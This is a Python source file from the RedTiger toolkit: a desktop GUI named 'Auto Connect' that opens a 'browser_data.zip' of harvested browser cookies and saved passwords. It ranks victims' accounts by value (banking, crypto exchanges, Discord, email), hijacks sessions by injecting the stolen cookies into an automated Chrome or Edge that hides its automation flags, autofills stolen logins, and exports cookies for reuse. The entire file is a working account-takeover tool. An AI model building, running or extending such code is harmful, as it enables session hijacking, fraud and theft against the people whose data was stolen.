# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *

import os, sys, zipfile, io, json, re, threading, time
import customtkinter as ctk
from tkinter import filedialog, messagebox
from urllib.parse import urlparse

Title("Auto Connect")

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as _ChrOpts
    from selenium.webdriver.edge.options  import Options as _EdgeOpts
    from selenium.webdriver.common.by     import By
    from selenium.webdriver.common.keys   import Keys
    _SEL_OK = True
except ImportError:
    _SEL_OK = False

_C = {
    "bg":       "#0d0d0d",
    "panel":    "#111111",
    "panel2":   "#1a1a1a",
    "card":     "#141414",
    "red":      "#e63946",
    "dred":     "#c0392b",
    "gray":     "#333333",
    "lgray":    "#888888",
    "white":    "#f1f5f9",
    "green":    "#22c55e",
    "yellow":   "#f59e0b",
    "orange":   "#f97316",
}

_OUTPUT_DIR = os.path.join(tool_path, "build")

_PRIORITY = {
    "discord.com", "google.com", "accounts.google.com", "gmail.com",
    "facebook.com", "instagram.com", "twitter.com", "x.com",
    "github.com", "steampowered.com", "store.steampowered.com",
    "roblox.com", "paypal.com", "amazon.com", "netflix.com",
    "twitch.tv", "binance.com", "coinbase.com", "kraken.com",
    "bybit.com", "okx.com", "reddit.com", "tiktok.com",
    "snapchat.com", "microsoft.com", "live.com", "outlook.com",
    "apple.com", "icloud.com", "spotify.com", "epic.com",
}
_ICONS = {
    "discord.com": "💬",   "google.com": "🔍",  "gmail.com": "📧",
    "facebook.com": "📘",  "instagram.com": "📷","twitter.com": "🐦",
    "x.com": "🐦",         "github.com": "💻",  "steampowered.com": "🎮",
    "roblox.com": "🎮",    "paypal.com": "💰",  "amazon.com": "📦",
    "netflix.com": "🎬",   "twitch.tv": "📺",   "binance.com": "₿",
    "coinbase.com": "₿",   "reddit.com": "🤖",  "spotify.com": "🎵",
    "tiktok.com": "📱",    "snapchat.com": "👻","microsoft.com": "🪟",
    "apple.com": "🍎",     "icloud.com": "☁️",
}


def _root_domain(d):
    d = d.lstrip(".")
    p = d.split(".")
    return ".".join(p[-2:]) if len(p) >= 2 else d

def _parse_netscape_cookies(text):
    out = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        p = line.split("\t")
        if len(p) < 7:
            continue
        try:
            out.append({
                "domain":  p[0],
                "path":    p[2],
                "secure":  p[3].upper() == "TRUE",
                "expires": int(p[4]) if p[4].isdigit() else 0,
                "name":    p[5],
                "value":   p[6],
            })
        except Exception:
            pass
    return out

_RE_CRED = re.compile(
    r"\[([^\]]+)\]\s*\n"
    r"URL:\s*(\S*)[^\n]*\n"
    r"(?:(?:Submit|Action):\s*[^\n]*\n)?"
    r"User:\s*(.*?)\s*\n"
    r"Pass:\s*(.*?)(?=\s*\[|\Z)",
    re.MULTILINE | re.DOTALL,
)

def _parse_passwords(text):
    out = []
    for m in _RE_CRED.finditer(text):
        src, url, user, pw = m.group(1), m.group(2).strip(), m.group(3).strip(), m.group(4).strip()
        if not user and not pw:
            continue
        out.append({"source": src, "url": url, "user": user, "password": pw})
    return out

def load_zip(path):
    """
    Parse browser_data.zip.
    Returns dict: root_domain → {cookies, credentials, sources}
    """
    db = {}

    def _ensure(rd):
        if rd not in db:
            db[rd] = {"cookies": [], "credentials": [], "sources": set()}

    try:
        with zipfile.ZipFile(path, "r") as zf:
            for name in zf.namelist():
                try:
                    raw = zf.read(name).decode("utf-8", errors="ignore")
                except Exception:
                    continue

                if name.endswith("_cookies.txt"):
                    ck_list = _parse_netscape_cookies(raw)
                    src = name.replace("_cookies.txt", "").replace("_", "/", 1)
                    for ck in ck_list:
                        rd = _root_domain(ck["domain"])
                        _ensure(rd)
                        db[rd]["cookies"].append(ck)
                        db[rd]["sources"].add(src)

                elif "_passwords" in name or name == "passwords.txt":
                    creds = _parse_passwords(raw)
                    for cr in creds:
                        try:
                            rd = _root_domain(urlparse(cr["url"]).netloc or cr["url"])
                        except Exception:
                            rd = cr["url"] or "unknown"
                        _ensure(rd)
                        db[rd]["credentials"].append(cr)
    except Exception:
        pass

    return db


def _build_driver(browser):
    if browser == "edge":
        opts = _EdgeOpts()
        opts.add_argument("--no-first-run")
        opts.add_argument("--disable-blink-features=AutomationControlled")
        opts.add_experimental_option("excludeSwitches", ["enable-automation"])
        opts.add_experimental_option("useAutomationExtension", False)
        opts.add_argument("--start-maximized")
        from selenium.webdriver.edge.service import Service as ES
        try:
            from webdriver_manager.microsoft import EdgeChromiumDriverManager
            return webdriver.Edge(service=ES(EdgeChromiumDriverManager().install()), options=opts)
        except Exception:
            return webdriver.Edge(options=opts)
    else:
        opts = _ChrOpts()
        opts.add_argument("--no-first-run")
        opts.add_argument("--disable-blink-features=AutomationControlled")
        opts.add_experimental_option("excludeSwitches", ["enable-automation"])
        opts.add_experimental_option("useAutomationExtension", False)
        opts.add_argument("--start-maximized")
        from selenium.webdriver.chrome.service import Service as CS
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            return webdriver.Chrome(service=CS(ChromeDriverManager().install()), options=opts)
        except Exception:
            return webdriver.Chrome(options=opts)

def _inject_cookies(driver, cookies):
    """CDP cookie injection — works for HttpOnly cookies too."""
    injected = 0
    for ck in cookies:
        try:
            payload = {
                "name":     ck["name"],
                "value":    ck["value"],
                "domain":   ck["domain"],
                "path":     ck.get("path", "/"),
                "secure":   ck.get("secure", False),
                "httpOnly": False,
            }
            if ck.get("expires", 0) > 0:
                payload["expires"] = ck["expires"]
            driver.execute_cdp_cmd("Network.setCookie", payload)
            injected += 1
        except Exception:
            pass
    return injected

def connect_cookies(domain, cookies, browser, cb):
    """Open browser, inject cookies, navigate to domain. cb(msg) for status updates."""
    if not _SEL_OK:
        cb("ERROR: selenium not installed — run:  pip install selenium webdriver-manager")
        return
    try:
        cb(f"Launching {browser}…")
        driver = _build_driver(browser)
        origin = f"https://{domain}"
        cb(f"Opening {origin}…")
        try:
            driver.get(origin)
            time.sleep(1.5)
        except Exception:
            try:
                driver.get(f"http://{domain}")
                time.sleep(1.5)
            except Exception:
                pass
        n = _inject_cookies(driver, cookies)
        cb(f"Injected {n} cookies via CDP…")
        try:
            driver.get(origin)
        except Exception:
            pass
        cb(f"Done — browser connected to {domain}.")
    except Exception as e:
        cb(f"ERROR: {e}")

_USER_SELECTORS = [
    "input[type=email]", "input[type=text][name*='user']",
    "input[type=text][name*='email']", "input[type=text][name*='login']",
    "input[name='email']", "input[name='username']", "input[name='login']",
    "input[id*='email']", "input[id*='user']", "#username", "#email", "#login",
    "input[autocomplete='username']", "input[autocomplete='email']",
]

def connect_password(url, user, password, browser, cb):
    """Open browser, navigate to login URL, auto-fill username + password."""
    if not _SEL_OK:
        cb("ERROR: selenium not installed — run:  pip install selenium webdriver-manager")
        return
    try:
        cb(f"Launching {browser}…")
        driver = _build_driver(browser)
        cb(f"Opening {url}…")
        driver.get(url)
        time.sleep(2.5)

        user_el = None
        for sel in _USER_SELECTORS:
            try:
                el = driver.find_element(By.CSS_SELECTOR, sel)
                if el.is_displayed() and el.is_enabled():
                    user_el = el
                    break
            except Exception:
                pass

        pass_el = None
        try:
            pass_el = driver.find_element(By.CSS_SELECTOR, "input[type=password]")
        except Exception:
            pass

        if user_el:
            user_el.clear()
            user_el.send_keys(user)
            cb(f"Username filled: {user}")
        if pass_el:
            pass_el.clear()
            pass_el.send_keys(password)
            cb("Password filled — press Enter in the browser to submit.")
        if not user_el and not pass_el:
            cb("Login fields not found automatically — fill manually in the browser.")
    except Exception as e:
        cb(f"ERROR: {e}")

def cookie_json_export(cookies):
    """Export to Cookie-Editor / EditThisCookie JSON format."""
    return json.dumps([
        {
            "domain":         c["domain"],
            "name":           c["name"],
            "value":          c["value"],
            "path":           c.get("path", "/"),
            "secure":         c.get("secure", False),
            "httpOnly":       False,
            "sameSite":       "Lax",
            "storeId":        "0",
            "expirationDate": c["expires"] if c.get("expires", 0) > 0 else None,
        }
        for c in cookies
    ], indent=2, ensure_ascii=False)

_PAGE_SIZE = 40

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class AutoConnectApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(f"{name_tool} {version_tool}  —  Auto Connect")
        self.geometry("1260x800")
        self.minsize(900, 560)
        self.configure(fg_color=_C["bg"])

        self._db               = {}
        self._all_domains      = []   # sorted master list
        self._filtered_domains = []   # after search filter
        self._page             = 0
        self._filter_text      = ctk.StringVar()
        self._filter_text.trace_add("write", lambda *_: self._on_search())
        self._browser          = ctk.StringVar(value="chrome")
        self._sv_status        = ctk.StringVar(value="Load a browser_data.zip to start.")
        self._sv_stats         = ctk.StringVar(value="No data loaded.")
        self._sv_page          = ctk.StringVar(value="")

        self._build_ui()

    def _build_ui(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        sb = ctk.CTkFrame(self, width=230, fg_color=_C["panel"], corner_radius=0)
        sb.grid(row=0, column=0, rowspan=2, sticky="nsew")
        sb.grid_propagate(False)
        sb.grid_columnconfigure(0, weight=1)
        sb.grid_rowconfigure(9, weight=1)

        ctk.CTkLabel(sb, text=name_tool,
                     font=ctk.CTkFont("Helvetica", 18, "bold"),
                     text_color=_C["red"]).grid(row=0, column=0, padx=16, pady=(20, 0), sticky="w")
        ctk.CTkLabel(sb, text="Auto Connect",
                     font=ctk.CTkFont("Helvetica", 11),
                     text_color=_C["lgray"]).grid(row=1, column=0, padx=16, pady=(2, 14), sticky="w")

        ctk.CTkFrame(sb, height=1, fg_color=_C["gray"]).grid(
            row=2, column=0, sticky="ew", padx=10, pady=(0, 10))

        ctk.CTkButton(sb, text="Browse ZIP", height=34, corner_radius=6,
                      fg_color=_C["red"], hover_color=_C["dred"],
                      font=ctk.CTkFont("Helvetica", 12),
                      command=self._browse_zip).grid(row=3, column=0, padx=12, pady=(0, 4), sticky="ew")
        ctk.CTkButton(sb, text="Scan build/", height=34, corner_radius=6,
                      fg_color=_C["panel2"], hover_color=_C["gray"],
                      font=ctk.CTkFont("Helvetica", 11),
                      command=self._scan_output).grid(row=4, column=0, padx=12, pady=(0, 10), sticky="ew")

        ctk.CTkFrame(sb, height=1, fg_color=_C["gray"]).grid(
            row=5, column=0, sticky="ew", padx=10, pady=(0, 10))

        ctk.CTkLabel(sb, textvariable=self._sv_stats,
                     font=ctk.CTkFont("Helvetica", 11),
                     text_color=_C["lgray"],
                     wraplength=200, justify="left").grid(row=6, column=0, padx=16, pady=(0, 10), sticky="w")

        ctk.CTkLabel(sb, text="Search", font=ctk.CTkFont("Helvetica", 11),
                     text_color=_C["lgray"], anchor="w").grid(row=7, column=0, padx=16, pady=(0, 2), sticky="w")
        ctk.CTkEntry(sb, textvariable=self._filter_text,
                     placeholder_text="google.com…",
                     fg_color=_C["panel2"], border_color=_C["red"],
                     text_color=_C["white"],
                     font=ctk.CTkFont("Helvetica", 12),
                     height=34
                     ).grid(row=8, column=0, padx=12, pady=(0, 10), sticky="ew")

        ctk.CTkFrame(sb, height=1, fg_color=_C["gray"]).grid(
            row=9, column=0, sticky="sew", padx=10)

        ctk.CTkLabel(sb, text="Browser",
                     font=ctk.CTkFont("Helvetica", 11),
                     text_color=_C["lgray"], anchor="w").grid(row=10, column=0, padx=16, pady=(10, 2), sticky="w")
        br_row = ctk.CTkFrame(sb, fg_color="transparent")
        br_row.grid(row=11, column=0, padx=12, pady=(0, 6), sticky="ew")
        br_row.grid_columnconfigure((0, 1), weight=1)
        self._btn_chrome = ctk.CTkButton(br_row, text="Chrome", height=30,
                                          fg_color=_C["red"], hover_color=_C["dred"],
                                          font=ctk.CTkFont("Helvetica", 11, "bold"),
                                          command=lambda: self._set_browser("chrome"))
        self._btn_chrome.grid(row=0, column=0, sticky="ew", padx=(0, 3))
        self._btn_edge = ctk.CTkButton(br_row, text="Edge", height=30,
                                        fg_color=_C["panel2"], hover_color=_C["gray"],
                                        font=ctk.CTkFont("Helvetica", 11, "bold"),
                                        command=lambda: self._set_browser("edge"))
        self._btn_edge.grid(row=0, column=1, sticky="ew", padx=(3, 0))

        if not _SEL_OK:
            ctk.CTkLabel(sb, text="selenium missing\npip install selenium webdriver-manager",
                         font=ctk.CTkFont("Helvetica", 10),
                         text_color=_C["yellow"],
                         wraplength=200, justify="left").grid(row=12, column=0, padx=16, pady=(8, 4), sticky="w")

        main = ctk.CTkFrame(self, fg_color=_C["bg"], corner_radius=0)
        main.grid(row=0, column=1, sticky="nsew")
        main.grid_rowconfigure(0, weight=1)
        main.grid_rowconfigure(1, weight=0)
        main.grid_columnconfigure(0, weight=1)

        self._scroll = ctk.CTkScrollableFrame(main, fg_color=_C["bg"],
                                               scrollbar_button_color=_C["red"],
                                               scrollbar_button_hover_color=_C["dred"])
        self._scroll.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
        self._scroll.grid_columnconfigure(0, weight=1)

        pbar = ctk.CTkFrame(main, fg_color=_C["panel"], corner_radius=0, height=42)
        pbar.grid(row=1, column=0, sticky="ew")
        pbar.grid_propagate(False)
        pbar.grid_columnconfigure(1, weight=1)

        self._btn_prev = ctk.CTkButton(pbar, text="← Prev", width=84, height=28,
                                        corner_radius=5,
                                        fg_color=_C["panel2"], hover_color=_C["gray"],
                                        font=ctk.CTkFont("Helvetica", 12),
                                        command=self._prev_page)
        self._btn_prev.grid(row=0, column=0, padx=(12, 6), pady=7)

        ctk.CTkLabel(pbar, textvariable=self._sv_page,
                     font=ctk.CTkFont("Helvetica", 12),
                     text_color=_C["lgray"]).grid(row=0, column=1, pady=7)

        self._btn_next = ctk.CTkButton(pbar, text="Next →", width=84, height=28,
                                        corner_radius=5,
                                        fg_color=_C["red"], hover_color=_C["dred"],
                                        font=ctk.CTkFont("Helvetica", 12),
                                        command=self._next_page)
        self._btn_next.grid(row=0, column=2, padx=(6, 12), pady=7)

        bar = ctk.CTkFrame(self, fg_color=_C["panel2"], corner_radius=0, height=26)
        bar.grid(row=1, column=1, sticky="ew")
        bar.grid_propagate(False)
        ctk.CTkLabel(bar, textvariable=self._sv_status,
                     font=ctk.CTkFont("Helvetica", 11),
                     text_color=_C["lgray"], anchor="w").pack(side="left", padx=10)

        ctk.CTkLabel(
            self._scroll,
            text="Load a browser_data.zip to see accounts.",
            font=ctk.CTkFont("Helvetica", 14),
            text_color=_C["gray"]
        ).grid(row=0, column=0, pady=80)

    def _set_browser(self, b):
        self._browser.set(b)
        if b == "chrome":
            self._btn_chrome.configure(fg_color=_C["red"], hover_color=_C["dred"])
            self._btn_edge.configure(fg_color=_C["panel2"], hover_color=_C["gray"])
        else:
            self._btn_chrome.configure(fg_color=_C["panel2"], hover_color=_C["gray"])
            self._btn_edge.configure(fg_color=_C["red"], hover_color=_C["dred"])

    def _browse_zip(self):
        path = filedialog.askopenfilename(
            title="Select browser_data.zip",
            filetypes=[("ZIP files", "*.zip"), ("All files", "*.*")]
        )
        if path:
            threading.Thread(target=self._load, args=(path,), daemon=True).start()

    def _scan_output(self):
        found = []
        try:
            for root, _, files in os.walk(_OUTPUT_DIR):
                for f in files:
                    if "browser_data" in f.lower() and f.endswith(".zip"):
                        found.append(os.path.join(root, f))
        except Exception:
            pass
        if not found:
            dl = os.path.expanduser("~/Downloads")
            try:
                for f in os.listdir(dl):
                    if "browser_data" in f.lower() and f.endswith(".zip"):
                        found.append(os.path.join(dl, f))
            except Exception:
                pass
        if not found:
            messagebox.showinfo(f"{name_tool}", "No browser_data.zip found in build/ or Downloads.")
            return
        found.sort(key=os.path.getmtime, reverse=True)
        threading.Thread(target=self._load, args=(found[0],), daemon=True).start()

    def _load(self, path):
        self._sv_status.set(f"Parsing {os.path.basename(path)}…")
        db = load_zip(path)
        self._db = db
        self.after(0, self._render_all)

    def _render_all(self):
        if not self._db:
            self._sv_stats.set("No data.")
            self._all_domains = []
            self._filtered_domains = []
            self._render_page()
            return

        def _sort_key(d):
            pri = 0 if d in _PRIORITY else 1
            return (pri, -len(self._db[d]["cookies"]))

        self._all_domains = sorted(self._db.keys(), key=_sort_key)

        total_ck = sum(len(v["cookies"])     for v in self._db.values())
        total_cr = sum(len(v["credentials"]) for v in self._db.values())
        self._sv_stats.set(
            f"{len(self._all_domains)} domains\n"
            f"{total_cr} passwords\n"
            f"{total_ck} cookies"
        )
        self._sv_status.set(
            f"{len(self._all_domains)} domains  —  {total_ck} cookies  —  {total_cr} passwords")

        self._page = 0
        self._filtered_domains = list(self._all_domains)
        self._render_page()

    def _render_page(self):
        for w in self._scroll.winfo_children():
            w.destroy()

        if not self._filtered_domains:
            msg = "No domains match your search." if self._filter_text.get() else "No data loaded."
            ctk.CTkLabel(self._scroll, text=msg,
                         font=ctk.CTkFont("Helvetica", 14),
                         text_color=_C["gray"]).grid(row=0, column=0, pady=80)
            self._sv_page.set("")
            self._btn_prev.configure(state="disabled")
            self._btn_next.configure(state="disabled")
            return

        total   = len(self._filtered_domains)
        n_pages = max(1, (total + _PAGE_SIZE - 1) // _PAGE_SIZE)
        self._page = max(0, min(self._page, n_pages - 1))

        start = self._page * _PAGE_SIZE
        end   = min(start + _PAGE_SIZE, total)
        page_domains = self._filtered_domains[start:end]

        for i, domain in enumerate(page_domains):
            card = self._make_card(domain, self._db[domain])
            card.grid(row=i, column=0, sticky="ew", padx=8, pady=3)

        self._sv_page.set(
            f"Page {self._page + 1} / {n_pages}   ({start + 1}–{end} of {total})")
        self._btn_prev.configure(state="normal" if self._page > 0             else "disabled")
        self._btn_next.configure(state="normal" if self._page < n_pages - 1   else "disabled")

        # scroll back to top
        try:
            self._scroll._parent_canvas.yview_moveto(0)
        except Exception:
            pass

    def _prev_page(self):
        if self._page > 0:
            self._page -= 1
            self._render_page()

    def _next_page(self):
        n_pages = max(1, (len(self._filtered_domains) + _PAGE_SIZE - 1) // _PAGE_SIZE)
        if self._page < n_pages - 1:
            self._page += 1
            self._render_page()

    def _on_search(self):
        q = self._filter_text.get().lower().strip()
        self._filtered_domains = (
            [d for d in self._all_domains if q in d] if q else list(self._all_domains)
        )
        self._page = 0
        self._render_page()

    def _make_card(self, domain, data):
        n_ck = len(data["cookies"])
        n_cr = len(data["credentials"])
        is_priority = domain in _PRIORITY
        icon = _ICONS.get(domain, "")

        card = ctk.CTkFrame(self._scroll, fg_color=_C["card"],
                             border_color=_C["red"] if is_priority else "#252525",
                             border_width=1, corner_radius=7)
        card.grid_columnconfigure(0, weight=1)

        row = ctk.CTkFrame(card, fg_color="transparent")
        row.grid(row=0, column=0, sticky="ew", padx=12, pady=8)
        row.grid_columnconfigure(1, weight=1)

        # Domain label
        label_parts = []
        if icon:
            label_parts.append(icon + "  ")
        label_parts.append(domain)
        if is_priority:
            label_parts.append("  ★")
        ctk.CTkLabel(row,
                     text="".join(label_parts),
                     font=ctk.CTkFont("Helvetica", 13, "bold"),
                     text_color=_C["red"] if is_priority else _C["white"],
                     anchor="w", width=260).grid(row=0, column=0, sticky="w")

        # Counts
        parts = []
        if n_ck: parts.append(f"{n_ck} cookies")
        if n_cr: parts.append(f"{n_cr} passwords")
        ctk.CTkLabel(row,
                     text="  •  ".join(parts) if parts else "no data",
                     font=ctk.CTkFont("Helvetica", 11),
                     text_color=_C["green"] if parts else _C["gray"],
                     anchor="w").grid(row=0, column=1, sticky="w", padx=(8, 0))

        # Actions
        acts = ctk.CTkFrame(row, fg_color="transparent")
        acts.grid(row=0, column=2, sticky="e")

        _B = dict(height=28, corner_radius=5, font=ctk.CTkFont("Helvetica", 11))
        if n_ck:
            ctk.CTkButton(acts, text="Cookie Login", width=104,
                          fg_color=_C["red"], hover_color=_C["dred"],
                          command=lambda d=domain, c=data["cookies"]: self._do_cookie_login(d, c),
                          **_B).pack(side="left", padx=(0, 4))
        if n_cr:
            ctk.CTkButton(acts, text="Password", width=80,
                          fg_color="#152a15", hover_color="#1f3d1f",
                          text_color=_C["green"],
                          command=lambda cr=data["credentials"]: self._do_password_login(cr),
                          **_B).pack(side="left", padx=(0, 4))
        if n_ck:
            ctk.CTkButton(acts, text="JSON", width=52,
                          fg_color=_C["panel2"], hover_color=_C["gray"],
                          text_color=_C["lgray"],
                          command=lambda d=domain, c=data["cookies"]: self._export_json(d, c),
                          **_B).pack(side="left", padx=(0, 4))
        if n_cr:
            ctk.CTkButton(acts, text="View", width=50,
                          fg_color=_C["panel2"], hover_color=_C["gray"],
                          text_color=_C["lgray"],
                          command=lambda cr=data["credentials"], d=domain: self._show_passwords(d, cr),
                          **_B).pack(side="left")

        return card

    def _do_cookie_login(self, domain, cookies):
        browser = self._browser.get()
        self._sv_status.set(f"Connecting to {domain} via cookies…")
        def _run():
            connect_cookies(domain, cookies, browser,
                            lambda msg: self.after(0, lambda m=msg: self._sv_status.set(m)))
        threading.Thread(target=_run, daemon=True).start()

    def _do_password_login(self, creds):
        if not creds:
            return
        if len(creds) == 1:
            cr = creds[0]
            self._launch_password(cr["url"], cr["user"], cr["password"])
            return

        win = ctk.CTkToplevel(self)
        win.title("Select credential")
        win.geometry("500x380")
        win.configure(fg_color=_C["bg"])
        win.grab_set(); win.lift(); win.focus_force()

        ctk.CTkLabel(win, text="Choose credential:",
                     font=ctk.CTkFont("Helvetica", 13, "bold"),
                     text_color=_C["white"]).pack(padx=16, pady=(16, 8), anchor="w")

        sf = ctk.CTkScrollableFrame(win, fg_color=_C["panel"])
        sf.pack(fill="both", expand=True, padx=12, pady=(0, 12))
        sf.grid_columnconfigure(0, weight=1)

        for i, cr in enumerate(creds):
            r = ctk.CTkFrame(sf, fg_color=_C["card"], corner_radius=6,
                              border_color="#2a2a2a", border_width=1)
            r.grid(row=i, column=0, sticky="ew", padx=4, pady=4)
            r.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(r, text=f"{cr['user']}  —  {cr['url'][:50]}",
                         font=ctk.CTkFont("Helvetica", 11),
                         text_color=_C["white"], anchor="w"
                         ).grid(row=0, column=0, padx=10, pady=8, sticky="w")
            ctk.CTkButton(r, text="Connect", width=84, height=28,
                          fg_color=_C["red"], hover_color=_C["dred"],
                          font=ctk.CTkFont("Helvetica", 11),
                          command=lambda c=cr, w=win: (
                              w.destroy(),
                              self._launch_password(c["url"], c["user"], c["password"])
                          )).grid(row=0, column=1, padx=10, pady=8)

    def _launch_password(self, url, user, password):
        browser = self._browser.get()
        self._sv_status.set(f"Opening {url}…")
        def _run():
            connect_password(url, user, password, browser,
                             lambda msg: self.after(0, lambda m=msg: self._sv_status.set(m)))
        threading.Thread(target=_run, daemon=True).start()

    def _export_json(self, domain, cookies):
        txt = cookie_json_export(cookies)
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            initialfile=f"{domain.replace('.','_')}_cookies.json",
            filetypes=[("JSON", "*.json"), ("All", "*.*")],
            title="Save Cookie-Editor JSON"
        )
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(txt)
            self._sv_status.set(f"Exported {len(cookies)} cookies → {os.path.basename(path)}")
        try:
            self.clipboard_clear()
            self.clipboard_append(txt)
            self._sv_status.set(self._sv_status.get() + "  (copied to clipboard)")
        except Exception:
            pass

    def _show_passwords(self, domain, creds):
        win = ctk.CTkToplevel(self)
        win.title(f"Passwords — {domain}")
        win.geometry("680x440")
        win.configure(fg_color=_C["bg"])
        win.grab_set(); win.lift(); win.focus_force()

        ctk.CTkLabel(win, text=f"Passwords  —  {domain}",
                     font=ctk.CTkFont("Helvetica", 14, "bold"),
                     text_color=_C["red"]).pack(padx=16, pady=(14, 6), anchor="w")

        sf = ctk.CTkScrollableFrame(win, fg_color=_C["panel"])
        sf.pack(fill="both", expand=True, padx=12, pady=(0, 12))
        sf.grid_columnconfigure((0, 1, 2), weight=1)

        for label, col in [("URL", 0), ("Username", 1), ("Password", 2)]:
            ctk.CTkLabel(sf, text=label, font=ctk.CTkFont("Helvetica", 11, "bold"),
                         text_color=_C["red"]).grid(row=0, column=col, padx=8, pady=(6, 4), sticky="w")
            ctk.CTkFrame(sf, height=1, fg_color=_C["gray"]).grid(
                row=1, column=col, sticky="ew", padx=8, pady=(0, 4))

        for i, cr in enumerate(creds, 1):
            bg = _C["card"] if i % 2 == 0 else "transparent"
            for col, val in enumerate([cr["url"][:45], cr["user"], cr["password"]]):
                ctk.CTkLabel(sf, text=val,
                             font=ctk.CTkFont("Helvetica", 11),
                             fg_color=bg,
                             text_color=_C["white"], anchor="w"
                             ).grid(row=i + 1, column=col, padx=8, pady=2, sticky="ew")



Slow(f"""
{red}  ██████╗ ██╗   ██╗██╗██╗  ██╗    ██╗
{red}  ██╔══██╗██║   ██║██║██║  ██║    ██║  {white}Auto Connect
{red}  ██████╔╝██║   ██║██║███████║    ██║  {white}Cookie injection  •  Password autofill
{red}  ██╔══██╗╚██╗ ██╔╝██║╚════██║    ╚═╝  {red}{name_tool} {version_tool}
{red}  ██║  ██║ ╚████╔╝ ██║     ██║    ██╗
{red}  ╚═╝  ╚═╝  ╚═══╝  ╚═╝     ╚═╝    ╚═╝{white}
""")

app = AutoConnectApp()
app.protocol("WM_DELETE_WINDOW", app.destroy)
app.mainloop()
Continue()
